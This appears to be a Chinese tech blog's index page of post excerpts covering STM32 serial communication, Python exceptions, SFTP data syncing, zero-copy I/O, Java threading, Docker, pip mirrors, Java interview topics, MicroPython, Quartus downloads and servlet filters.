		目录 1、串口通信协议（简介+软硬件规则） 2、STM32内部的USART外设 3、USART基本结构（江科大简化） 4、串口发送代码 4-1 基本流程 4-2 整体代码 4-2-1 main.c 4-2-2 Serial.c 4-2-3 Serial.h 5、串口接收代码 5-1 查询 5-2 中断 5-3 整体代码 5-3-1 main.c 5-3-2 Serial.c 5-3-3 Serial.h 6、USART串口数据包 6-1 使用状态机接收数据包的思路 6-2 串口收发HEX数据包 6-2-1 main.c 6-2-2 Serial.c 6-2-3 Serial.h 6-3串口收发文本数据包 6-3-1 main.c 6-3-2 Serial.c 6-3-3 Serial.h 补充 1、串口通信协议（简介+软硬件规则） 全双工：打电话。半双工：对讲机。单工：广播
时钟：I2C和SPI有单独的时钟线，所以它们是同步的，接收方可以在时钟信号的指引下进行采样。串口、CAN和USB没有时钟线，需要双方约定一个采样频率，它们是异步的，并且需要加一些帧头帧尾等进行采样位置的对齐。
电平：1、单端-&gt;引脚的高低电平都是对GND的电压差，所以单端信号通信的双方必须要共地，就是把GND接在一起。2、
差分-&gt;它是靠两个差分引脚的电压差来传输信号的，在通讯的时候，可以不需要共地，可极大提高抗干扰特性，所以差分信号一般传输速度和距离都会非常高。
设备：点对点-&gt;老师单独找一位学生谈话；多设备-&gt;老师在教室里面对所有同学谈话，需要有一个寻址的过程，以确定通信的对象。寻址：给不同的设备编号，对应不同的学生的名字 波特率：如果双方规定波特率为1000bps，表示1s要发送1000位，每一位的时间就是1ms。 发送方每隔1ms发送1位，接收方每隔1ms接收1位。波特率，它决定了每隔多久发送一位。
起始位：首先，串口的空闲状态是高电平，也就是没有数据传输的时候，引脚必须要置高电平，作为空闲状态，然后需要传输的时候，必须要先发送一个起始位，这个起始位必须是低电平，来打破空闲状态的高电平，产生一个下降沿，该下降沿就告诉设备这一帧数据要开始了。如果没有起始位，数据线就一直都是高电平，没有任何波动，这样接收方怎么知道要接收数据呢。
停止位：为下一个起始位做准备。如果没有停止位，那当我数据最后一位是0的时候，下次再发送新的一帧，就没有办法产生下降沿了。
例子，连续发送两个0x55，1个停止位和2个停止位
校验位：串口使用的是一种叫奇偶校验的数据验证方法。奇偶校验可以判断数据传输是否出错。如果数据出错了，可以选择丢弃或者要求重传。
’
串口通信总结：TX引脚输出定时翻转的高低电平，RX引脚定时读取引脚的高低电平。每个字节的数据加上起始位，停止位，可选的校验位（无，奇，偶），打包成数据帧，一次输出在TX引脚，另一端RX引脚依次接收，这样就完成了字节数据的传递。
’
2、STM32内部的USART外设 USART外设就是串口通信的硬件支持电路。
常用配置：波特率9600或者115200，数据位8位，停止位1位，无校验
USART1:APB2总线的设备
USART2、USART3：APB1总线的设备
’
USART功能框图 TX和RX走线
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b679cbe6cc1e503b5ed428034ad00eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4df64fadf033a5093fceaad9de685d1a/" rel="bookmark">
			python中的异常和错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一，两者的区别
二，异常处理：
1.正常异常处理
2.异常一次只识别一个错误
3.识别没有列出的错误 Exception 4.没有发生错误执行 else
5.无论正常还是异常都必须执行 finally ：
6.主动抛出异常 raise 7.指定捕获的错误
三，异常错误类型
一，两者的区别 错误：语法错误（逻辑错误），缩进错误 不可以被处理 异常：在程序运行期间遇到的错误 可以被处理 二，异常处理： 1.正常异常处理 try： 正常执行的语法(有可能遇到异常) except： 出现处理的语句 try中遇到异常,将异常抛给python解释器，except语句捕获异常，然后进行处理（出现处理的语句） list_data = [1, 2, 3, 4] try: print(list_data[9]) except IndexError: print(IndexError) 显示：&lt;class 'IndexError'&gt;
2.异常一次只识别一个错误 异常可以一下是多个，但是当执行到相应的错误之后后面的错误就不会被打印
语法：
try： 要执行的语句（多条语句，使用有可能在某些情况下运行出现一种异常，在另一些情况出现另一种异常） 在出现多个不同情况下的不同异常时，要做不同的异常处理 except 异常1： 处理异常1 except 异常2： 处理异常2 except 异常3： 处理异常3 ....... 示例： name = 2 list_data = [1, 2, 3, 4] try: print(names, list_data[9]) except NameError as r: print(r) except IndexError: print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4df64fadf033a5093fceaad9de685d1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d46331362f6d4b95b0f263cb6f7140a0/" rel="bookmark">
			如何快速同步第三方平台数据？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 最近知识星球中有位小伙伴问了我一个问题：如何快速同步第三方平台数据？
他们有个业务需求是：需要同步全国34个省市，多个系统的8种业务数据，到他们公司的系统当中。
他们需求同步全量的数据和增量的数据。
全量的数据主要是针对多个系统的历史数据，大概有几千万数据，只需要初始化一次即可。
而增量的数据，是系统后续变更的数据。
这个需求其实不简单，至少有以下难点：
不能直接访问第三方数据库。
不能将历史数据导出到excel中，有泄露数据的风险。
如何快速同步历史数据？
增量数据如何处理？
接口需要做限流吗？
增量数据如何校验数据的一致性？
带着这些问题，开始今天的文章之旅。
1. 如何快速同步历史数据？ 想要快速同步历史数据，第一个想到的可能是直接同步数据库中的数据。
但多个第三方系统为了数据安全考虑，不可能直接把他们的数据库访问地址和相关账号密码告诉你。
即使他们告诉你了，但有很多个系统，你一个个去连数据库查数据，也非常麻烦。
有些小伙伴可能会说：这好办，让第三方系统把他们的历史数据导出到excel中，我们写个程序解析去这些excel，就能将数据快速导入到我们的数据库中。
这是个好办法，但忽略了一点：这些数据是敏感数据，不能对外暴露。
因此导出excel的方案行不通。
那么，该如何快速同步历史数据呢？
答：使用SFTP。
不知道你有没有跟银行对接过，SFTP在银行业务中经常会用到。
那么，如何用SFTP同步数据呢？
2. 如何使用SFTP？ 说起SFTP，就不得不说一说FTP。
我们都知道，FTP是用来传送文件的协议。使用FTP实现远程文件传输的同时，还可以保证数据传输的可靠性和高效性。
而SFTP是一种可以安全传输文件的协议，它是一种基于SSH（Secure Shell）的文件传输协议，它允许用户将文件以加密的形式传输到远程服务器上，以保护文件的安全性。
FTP和SFTP有哪些区别呢？
链接方式不同：FTP使用TCP的21号端口建立连接。而SFTP是在客户端和服务器之间通过 SSH 协议 (即TCP22号端口) 建立的安全连接来传输文件。
安全性不同：SFTP使用加密传输认证信息和传输的数据，相对于FTP更安全一些。
传输效率不同：SFTP传输文件时使用了加密解密技术，因此传输效率比普通的FTP要低一些。
使用协议不同：FTP使用了TCP/IP协议，而SFTP使用了SSH协议。
安全通道：SFTP协议提供了一个安全通道，用于在网络上的主机之间传输文件。而FTP协议没有安全通道。
因此可见，我们使用SFTP来传输文件还是比较安全的。
那么，如何使用SFTP来实现同步历史数据的需求呢？
答：这就需要我们做好SFTP的账号、目录和文件格式的规划了。
2.1 账号权限控制 首先需要运维同学搭建一个SFTP服务器，提供一个可以对外访问的域名和端口号。
然后需要在根目录下，创建一个存放文件的目录，比如：/data。
然后给每个省市的第三方系统都创建一个子目录，比如：/data/sichuan、/data/shenzhen、/data/beijing等。
接下来，我们需要给每个子目录创建一个账号，以及分配权限。
比如有个账号是：sichuan，密码是：sisuan123。这个账号只拥有/data/sichuan目录读数据和写数据的权限。
另外一个账号是：shenzhen，密码是：shenzhen123。这个账号只拥有/data/目录读数据和写数据的权限。
以此类推。
当然大家如果不放心，可以用在线工具，将密码设置成一个8位的随机字符串，包含字母、数字和特殊字符，这样的密码安全性相对来说要高一些。
这样相关的第三方系统都有往SFTP自己目录下读和写数据的权限。
在这里温馨提醒一下：上面这些账号读数据的权限，主要是为了后面他们好排查问题用的，不是必须分配的，我们需要根据实际情况而定。
此外，还需要给我们自己分配一个账号，开通对/data整个目录的只读权限。
2.2 统一数据格式 接下来，最关键的一步是要制定一个统一的文件格式和数据格式。
文件名称为：sichuan_20230724.txt。
也就是用 省市拼音_日期.txt 的格式。
这样大家就能非常清楚的看出，是哪个省市，哪个日期产生的数据。
然后我们需要规定txt文件的格式。
比如：id占20个字符，name占30个字符，金额占10个字符等等。
如果有些列的数据不满对应的字符长度，前面可以补0。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d46331362f6d4b95b0f263cb6f7140a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0888a47bc7cc9e4927f1b7fddfc0b8a0/" rel="bookmark">
			零拷贝原来这么简单！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们总会在各种地方看到零拷贝，那零拷贝到底是个什么东西。
接下来，让我们来理一理啊。
拷贝说的是计算机里的 I/O 操作，也就是数据的读写操作。计算机可是一个复杂的家伙，包括软件和硬件两大部分，软件主要指操作系统、驱动程序和应用程序。硬件那就多了，CPU、内存、硬盘等等一大堆东西。
这么复杂的设备要进行读写操作，其中繁琐和复杂程度可想而知。
传统I/O的读写过程 如果要了解零拷贝，那就必须要知道一般情况下，计算机是如何读写数据的，我把这种情况称为传统 I/O。
数据读写的发起者是计算机中的应用程序，比如我们常用的浏览器、办公软件、音视频软件等。
而数据的来源呢，一般是硬盘、外部存储设备或者是网络套接字（也就是网络上的数据通过网口+网卡的处理）。
过程本来是很复杂的，所以大学课程里要通过《操作系统》、《计算机组成原理》来专门讲计算机的软硬件。
简化版读操作流程 那么细的没办法讲来，所以，我们把这个读写过程简化一下，忽略大多数细节，只讲流程。
上图是应用程序进行一次读操作的过程。
应用程序先发起读操作，准备读取数据了；
内核将数据从硬盘或外部存储读取到内核缓冲区；
内核将数据从内核缓冲区拷贝到用户缓冲区；
应用程序读取用户缓冲区的数据进行处理加工；
详细的读写操作流程 下面是一个更详细的 I/O 读写过程。这个图可好用极了，我会借助这个图来厘清 I/O 操作的一些基础但非常重要的概念。
先看一下这个图，上面红粉色部分是读操作，下面蓝色部分是写操作。
如果一下子看着有点儿迷糊的话，没关系，看看下面几个概念就清楚了。
应用程序 就是安装在操作系统上的各种应用。
系统内核 系统内核是一些列计算机的核心资源的集合，不仅包括CPU、总线这些硬件设备，也包括进程管理、文件管理、内存管理、设备驱动、系统调用等一些列功能。
外部存储 外部存储就是指硬盘、U盘等外部存储介质。
内核态 内核态是操作系统内核运行的模式，当操作系统内核执行特权指令时，处于内核态。
在内核态下，操作系统内核拥有最高权限，可以访问计算机的所有硬件资源和敏感数据，执行特权指令，控制系统的整体运行。
内核态提供了操作系统管理和控制计算机硬件的能力，它负责处理系统调用、中断、硬件异常等核心任务。
用户态 这里的用户可以理解为应用程序，这个用户是对于计算机的内核而言的，对于内核来说，系统上的各种应用程序会发出指令来调用内核的资源，这时候，应用程序就是内核的用户。
用户态是应用程序运行的模式，当应用程序执行普通的指令时，处于用户态。
在用户态下，应用程序只能访问自己的内存空间和受限的硬件资源，无法直接访问操作系统的敏感数据或控制计算机的硬件设备。
用户态提供了一种安全的运行环境，确保应用程序之间相互隔离，防止恶意程序对系统造成影响。
模式切换 计算机为了安全性考虑，区分了内核态和用户态，应用程序不能直接调用内核资源，必须要切换到内核态之后，让内核来调用，内核调用完资源，再返回给应用程序，这个时候，系统在切换会用户态，应用程序在用户态下才能处理数据。
上述过程其实一次读和一次写都分别发生了两次模式切换。
内核缓冲区 内核缓冲区指内存中专门用来给内核直接使用的内存空间。可以把它理解为应用程序和外部存储进行数据交互的一个中间介质。
应用程序想要读外部数据，要从这里读。应用程序想要写入外部存储，要通过内核缓冲区。
用户缓冲区 用户缓冲区可以理解为应用程序可以直接读写的内存空间。因为应用程序没法直接到内核读写数据， 所以应用程序想要处理数据，必须先通过用户缓冲区。
磁盘缓冲区 PageCache PageCache 是 Linux 内核对文件系统进行缓存的一种机制。它使用空闲内存来缓存从文件系统读取的数据块，加速文件的读取和写入操作。
当应用程序或进程读取文件时，数据会首先从文件系统读取到 PageCache 中。如果之后再次读取相同的数据，就可以直接从 PageCache 中获取，避免了再次访问文件系统。
同样，当应用程序或进程将数据写入文件时，数据会先暂存到 PageCache 中，然后由 Linux 内核异步地将数据写入磁盘，从而提高写入操作的效率。
再说数据读写操作流程 上面弄明白了这几个概念后，再回过头看一下那个流程图，是不是就清楚多了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0888a47bc7cc9e4927f1b7fddfc0b8a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53f28f47316d057ec35eaae201054ef1/" rel="bookmark">
			线程交替执行经典问题(生产者和消费者问题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		让两个线程交替打印出1A2B3C4D5E6F?
一、使用LockSupport 如果只有两个线程，使用LockSupport实现比较简单快捷，但是当有多个线程的时候，LockSupport.unpark(指定线程)，我们不知道那个指定线程需要唤醒。所以不适用多个线程的情况。
package com.itheima.security.springboot.juc; import java.util.concurrent.locks.LockSupport; /** * @Title: 模拟线程交替执行经典问题 * @Description: TODO * @Params: * @return * @throws * @Author: Vector * @DateTime: */ public class T04_LockSupport { static Thread t1, t2; public static void main(String[] args) { char[] arrayA = "1234567".toCharArray(); char[] arrayB = "ABCDEFG".toCharArray(); t1 = new Thread(() -&gt; { for (char temp : arrayA) { System.out.println(temp); LockSupport.unpark(t2); //唤醒t2线程 LockSupport.park();//t1线程阻塞 todo 即让当前线程进入阻塞状态 } }, "t1"); t2 = new Thread(() -&gt; { for (char temp : arrayB) { LockSupport.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53f28f47316d057ec35eaae201054ef1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9fb3a7a42bbdfe9b37f5788953997bf/" rel="bookmark">
			docker全解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 说明docker简介为什么是docker容器与虚拟机比较容器发展简史传统虚拟机技术容器虚拟化技术 docker能干什么带来技术职级的变化开发/运维（Devops)新一代开发工程师Docker应用场景why docker？docker的优势 docker和dockerHub官网 Docker安装CentOS Docker安装docker查看自己的内核安装阿里云镜像加速永远的HelloWorld Docker的基本组成镜像（image）容器（container）仓库（repository）小总结Docker平台架构图解Docker工作原理整体架构及底层通信原理简述Docker运行的基本流程底层原理（为什么Docker会比VM虚拟机快） Docker常用命令帮助启动类命令镜像命令docker imagesdocker searchdocker pulldocker system df 查看镜像/容器/数据卷所占用的空间docker rmi 删除镜像docker虚悬镜像 容器命令新建+启动容器启动守护式容器（后台服务器）： docker ps列出当前所有正在运行的容器退出容器启动已停止运行的容器docker logs查看容器日志docker top查看容器内运行的进程docker inspect查看容器内部细节（审查容器）docker exec进入正在运行的容器并以命令行交互docker cp从容器内拷贝文件到主机上导入和导出容器 限制资源命令总结 Docker镜像Docker镜像加载原理为什么Docker镜像要采用分层结构Docker镜像commit操作案例 本地镜像发布到阿里云默认的Hub地址本地镜像发布到阿里云流程镜像生成的方法将本地镜像推送到阿里云将阿里云上的镜像下载到本地 本地镜像发布到私有库本地镜像发布到私有库流程 Docker容器数据卷使用特性数据卷案例宿主vs容器之间映射添加容器卷 读写规则映射添加说明卷的集成和共享 Docker常规安装简介安装tomcat安装mysql安装redis docker复杂安装安装mysql主从复制安装redis集群(cluster)主从容错切换迁移案例容错切换迁移主从扩容案例 DockerFile解析DockerFile是什么DockerFile构建过程解析DockerFile内容基础知识Docker执行DockerFile的大致流程小总结DockerFile常用保留字指令小总结自定义镜像mycentosjava8目标编写构建运行 虚悬镜像家庭作业自定义myubuntu Docker网络Docker 网络是什么docker不启动，默认网络情况docker启动后，网络情况常用基本命令All 命令docker network ls查看网络查看网络源数据删除网络创建网络 docker网络的作用（能干嘛）docker网络模式总体介绍容器实例内默认网络IP生产规则案例说明bridge模式案例两两匹配验证Host模式是什么案例 none模式是什么案例 container模式是什么案例 自定义网络案例 Docker平台架构图解Docker轻量级可视化工具Portainerdocker安装 说明 docker全解仅以作者【在读大学生】视角去认识，学习，使用docker，且以使用为主学习底层为辅进行书写，欢迎读者斧正。
docker简介 为什么是docker Docker的出现得以打破过去「程序即应用」的观念。透过镜像(images)将作业系统核心除外，运作应用程式所需要的系统环境，由下而上打包，达到应用程式跨平台间的无缝接轨运作。【docker理念】：解决了运行环境和配置问题的软件容器，方便持续继承并有助于整体发布的容器虚拟化技术。 容器与虚拟机比较 容器发展简史 传统虚拟机技术 虚拟机（virtual machine）就是带环境安装的一种解决方案。
它可以在一种操作系统里面运行另一种操作系统，比如在Windows10系统里面运行Linux系统CentOS7。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。这类虚拟机完美的运行了另一套系统，能够使应用程序，操作系统和硬件三者之间的逻辑不变。
虚拟机的缺点：
资源占用多冗余步骤多启动慢 容器虚拟化技术 由于前面虚拟机存在某些缺点，Linux发展出了另一种虚拟化技术：
Linux容器(Linux Containers，缩写为 LXC)
Linux容器是与系统其他部分隔离开的一系列进程，从另一个镜像运行，并由该镜像提供支持进程所需的全部文件。容器提供的镜像包含了应用的所有依赖项，因而在从开发到测试再到生产的整个过程中，它都具有可移植性和一致性。
Linux 容器不是模拟一个完整的操作系统 而是对进程进行隔离。有了容器，就可以将软件运行所需的所有资源打包到一个隔离的容器中。
容器与虚拟机不同，不需要捆绑一整套操作系统 ，只需要软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境中的软件都能始终如一地运行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9fb3a7a42bbdfe9b37f5788953997bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba095cbc45442b1c8920b189190b3ed3/" rel="bookmark">
			python的包管理器pip安装经常失败的解决办法：修改pip镜像源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 pip 常用的国内镜像源：
https://pypi.tuna.tsinghua.edu.cn/simple/ // 清华 http://mirrors.aliyun.com/pypi/simple/ // 阿里云 https://pypi.mirrors.ustc.edu.cn/simple/ // 中国科技大学 http://pypi.hustunique.com/ // 华中理工大学 http://pypi.sdutlinux.org/ // 山东理工大学 http://pypi.douban.com/simple/ // 豆瓣 以设置阿里云镜像源为例（我的电脑系统为 Windows10 ）：
// 修改 index-url pip config set global.index-url http://mirrors.aliyun.com/pypi/simple/ // 修改 trusted-host pip config set install.trusted-host mirrors.aliyun.com 使用 pip 安装 requests 库，很快就能安装成功；未修改镜像源之前，出现好多好多红字（辣眼睛）。
pip install requests 因为我本地还安装有其他版本的python，
所以可以查看 requests 库安装的位置是否正确：
pip show requests 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3a3f625761b13f40149ced9e3fc972d/" rel="bookmark">
			【Java面试丨企业场景】常见技术场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、单点登录怎么实现的 1. 介绍 单点登录（Single Sign On，SSO）：只需要登录一次，就可以访问所有信任的应用系统
2. 解决方案 JWT解决单点登录问题
用户访问应用系统，会在网关判断Token是否有效如果Token无效，则会返回401（认证失败），前端跳转到登录界面用户发送登录请求，网关路由到登录服务，认证校验返回给浏览器一个Token，浏览器将Token保存到Cookie中随后，再去访问应用系统其他服务时，都需要携带Token，由网关统一验证后路由到目标服务 二、权限认证是如何实现的 1. 介绍 后台的管理系统更加注重权限控制，最常见的是RBAC模型来实现RBAC（Role-Based Access Control）：基于角色的访问控制具体实现
（1）5张表（用户表、角色表、权限表、用户-角色中间表、角色-权限中间表）
（2）7张表（用户表、角色表、权限表、菜单表、用户-角色中间表、角色-权限中间表、权限-菜单中间表） 2. 案例分析 三、上传数据的安全性怎么控制（网络传输数据安全性） 1. 介绍 用户通过浏览器发送请求，请求数据通过网络传输的，如果是非常敏感的数据，如果有人恶意拦截，可能造成损失可以使用非对称加密（或者对称加密），给前端一个公钥让其把数据加密后传到后台，后台负责解密后处理数据 2. 解决方案 对称加密：数据加密和解密使用相同的秘钥，即加密秘钥也可以用作解密秘钥
（1）优点：加密速度快，效率高
（2）缺点：相对不太安全（不要保存敏感信息）非对称加密：有两个秘钥，公开秘钥负责加密，私有秘钥负责解密
（1）优点：与对称加密相比，安全性更高
（2）缺点：加密和解密速度慢，建议少量数据加密 3. 总结 文件很大建议使用对称加密，不过不能保存敏感信息文件较小，要求安全性高，建议采用非对称加密 四、负责的项目模块遇到哪些棘手问题，如何解决 1. 介绍 什么背景（技术问题）解决问题过程最终落地方案 2. 案例分享 五、怎么做压测（性能测试）的 六、项目中日志如何采集的 1， 介绍 日志是定位系统问题的重要手段，根据日志信息快速单位系统中的问题采集日志的方式
（1）常规采集：按天保存到一个日志文件
（2）ELK：Elasticsearch、Logstash、Kibana 2. ELK案例分享 Elasticsearch：全文搜索分析引擎，可以对数据存储、搜索、分析Logstash：数据收集引擎，可以动态收集数据，对数据进行过滤、分析，将数据存储到指定的位置Kibana：数据分析和可视化平台，配合Elasticsearch对数据进行搜索、分析、图表化展示 七、查看日志的命令 目前采集日志的方式：按天保存到一个日志文件中Linux中查看日志
（1）实时监控日志的变化
（2）按照行号查询
（3）按照关键字查找日志信息
（4）按照日期查询
（5）日志太多，处理方式
八、怎么快速定位系统的瓶颈 压测（性能测试）：项目上线之前测评系统的压力监控工具、链路追踪工具：项目上线之后监控线上诊断工具Arthas：项目上线之后监控、排查
九、生产问题怎么排查 1. 介绍 已经上线的bug排查思路
（1）先分析日志，通常在业务中都会有日志的记录，或者查看系统日志，或者查看日志文件，然后定位问题
（2）远程debug：debug公司的测试环境，调试代码 2. 远程debug案例分析 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/feb513abbd3be69ec1565a7ada2fad33/" rel="bookmark">
			【雕爷学编程】MicroPython动手做（13）——掌控板之RGB三色灯2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		知识点：什么是掌控板？
掌控板是一块普及STEAM创客教育、人工智能教育、机器人编程教育的开源智能硬件。它集成ESP-32高性能双核芯片，支持WiFi和蓝牙双模通信，可作为物联网节点，实现物联网应用。同时掌控板上集成了OLED显示屏、RGB灯、加速度计、麦克风、光线传感器、蜂鸣器、按键开关、触摸开关、金手指外部拓展接口，支持图形化及MicroPython代码编程，可实现智能机器人、创客智造作品等智能控制类应用。
掌控板硬件特性:
ESP-32主控
处理器：Tensilica LX6双核处理器（一核处理高速连接；一核独立应用开发）
主频：高达240MHz的时钟频率
SRAM：520KB
Flash：8MB
Wi-Fi标准：FCC/CE/TELEC/KCC
Wi-Fi协议：802.11 b/g/n/d/e/i/k/r (802.11n，速度高达150 Mbps)，A-MPDU和A-MSDU聚合，支持0.4us防护间隔
频率范围：2.4~2.5 GHz
蓝牙协议：符合蓝牙v4.2 BR/EDR和BLE标准
蓝牙音频：CVSD和SBC音频低功耗：10uA
供电方式：Micro USB供电
工作电压：3.3V
最大工作电流:200mA
最大负载电流:1000mA
掌控板载
三轴加速度计MSA300,测量范围:±2/4/8/16G
地磁传感器MMC5983MA,测量范围:±8 Gauss;精度0.4mGz,电子罗盘误差±0.5°
光线传感器
麦克风
3 颗全彩ws2812灯珠
1.3英寸OLED显示屏，支持16*16字符显示，分辨率128x64
无源蜂鸣器
支持2个物理按键(A/B)、6个触摸按键
支持1路鳄鱼夹接口，可方便接入各种阻性传感器
拓展接口
20通道数字I/O， (其中支持12路PWM，6路触摸输入)
5通道12bit模拟输入ADC，P0~P4
1路的外部输入鳄鱼夹接口:EXT/GND
支持I2C、UART、SPI通讯协议
6、RGB蓝色呼吸灯
i = None from mpython import * import time while True: for i in range(256): rgb.fill( (int(0), int(0), int(i)) ) rgb.write() time.sleep_ms(1) time.sleep_ms(20) for i in range(255, -1, -1): rgb.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/feb513abbd3be69ec1565a7ada2fad33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc1831724d309ed9f05772bee45fec20/" rel="bookmark">
			Quartus各版本下载分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天分享一下Quartus各版本的下载链接
Quartus是由英特尔（Intel）公司开发的一款用于FPGA设计的集成化开发环境（IDE）。它提供了一系列的工具和功能，用于设计、调试和验证复杂的数字电路。
一、Quartus介绍 Quartus主要用于针对英特尔公司的FPGA器件进行设计。它支持各种型号的FPGA芯片，包括Cyclone、Arria和Stratix等系列。使用Quartus，设计人员可以创建逻辑电路、编写硬件描述语言（HDL）代码，并进行综合、布局布线、时序分析以及生成可下载到FPGA器件的位流文件。
Quartus软件有多个版本，每个版本提供不同的功能和特性。以下是一些常见的Quartus版本及其区别：
Quartus Prime Lite Edition：Lite Edition是免费的版本，适用于入门级和小型项目。它提供了基本的设计功能，包括设计入口、综合、布局布线和仿真等。然而，它的功能相对较少，例如没有时序分析和高级优化功能。
Quartus Prime Standard Edition：Standard Edition是针对中等规模项目的版本，提供了更多功能和特性。它包括了Lite Edition的所有功能，并增加了时序分析、时序优化、高级布局布线和设计验证等功能。这个版本适用于大多数常规FPGA设计需求。
Quartus Prime Pro Edition：Pro Edition是Quartus的高级版本，专为复杂、大规模的设计项目和专业用户而设计。它提供了最全面的功能和高级特性。与Standard Edition相比，Pro Edition在时序优化、布局布线、时序分析和时钟管理等方面具有更强的能力。
Quartus Prime PowerPlay Edition：PowerPlay Edition是专门针对功耗优化的版本。它提供了一系列的功耗分析和优化工具，帮助设计人员在保持性能的同时降低功耗。
需要注意的是，不同版本的Quartus可能适用于不同的FPGA芯片型号和系列。因此，在选择Quartus版本时，需要根据自己的项目需求和目标器件进行选择。
一般使用Quartus Prime Lite Edition就够用了。
二、Quartus各版本的下载链接 Quartus-lite-17.0.0
https://pan.quark.cn/s/1b94a15842ea
Quartus-lite-17.1.0
https://pan.quark.cn/s/e8bac131dbed
Quartus-lite-18.0.0
https://pan.quark.cn/s/de504877c7f5
Quartus-lite-18.1.0
https://pan.quark.cn/s/b27875e28690
Quartus-lite-19.1.0
https://pan.quark.cn/s/a3c8c37bdd42
Quartus-lite-20.1.0
https://pan.quark.cn/s/8cb5c5b2a816
Quartus-lite-20.1.1
https://pan.quark.cn/s/380ece3a08a9
Quartus-lite-21.1.0
https://pan.quark.cn/s/f367b1f5f636
Quartus-lite-21.1.1
https://pan.quark.cn/s/d4e7f6175e54
Quartus-lite-22.1std.0.915
https://pan.quark.cn/s/ed145f0a321e
Quartus-lite-22.1std.1.917
https://pan.quark.cn/s/98f2fd675815
三、Vivado全版本链接 这里分享下Quartus各版本集合链接，建议订阅一下，后续有版本更新，都会放在这个文件夹。
https://pan.quark.cn/s/3b67e51f3eda
本文将不断定期更新中，码字不易，点⭐️赞，收⭐️藏一下，不走丢哦
本文由FPGA狂飙原创，有任何问题，都可以在评论区和我交流哦
您的支持是我持续创作的最大动力！如果本文对您有帮助，请给一个鼓励，谢谢。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ac400ca0281c044de77433e0d52f771/" rel="bookmark">
			过滤器Filter，登陆验证，过滤敏感词，动态代理，Listener
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Filter：过滤器 概念：
生活中的过滤器：净水器,空气净化器，土匪、web中的过滤器：当访问服务器的资源时，过滤器可以将请求拦截下来，完成一些特殊的功能。过滤器的作用： 一般用于完成通用的操作。如：登录验证、统一编码处理、敏感字符过滤… 快速入门：
步骤： 定义一个类，实现接口Filter复写方法配置拦截路径 web.xml注解 代码： package cn.itcast.web.filter; import javax.servlet.*; import java.io.IOException; /** * 过滤器快速入门程序 */ //@WebFilter("/*")//访问所有资源之前，都会执行该过滤器 public class FilterDemo1 implements Filter { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println("filterDemo1被执行了...."); //放行 filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } } 过滤器细节： web.xml配置 &lt;filter&gt; &lt;filter-name&gt;demo1&lt;/filter-name&gt; &lt;filter-class&gt;cn.itcast.web.filter.FilterDemo1&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;demo1&lt;/filter-name&gt; &lt;!-- 拦截路径 --&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 过滤器执行流程
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ac400ca0281c044de77433e0d52f771/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e76a452ce59503419914d718b915926a/" rel="bookmark">
			安装完 Python 之后，如何设置 Python 环境变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		人生苦短，我用 Python。最近有许多加群的萌新在咨询 Python 安装的事宜，Python 安装问题不大，可以戳这篇文章：本以为安装 Python 之后就可以万事大吉，高枕无忧了，往命令行中输入 python，发现有下图的错误。
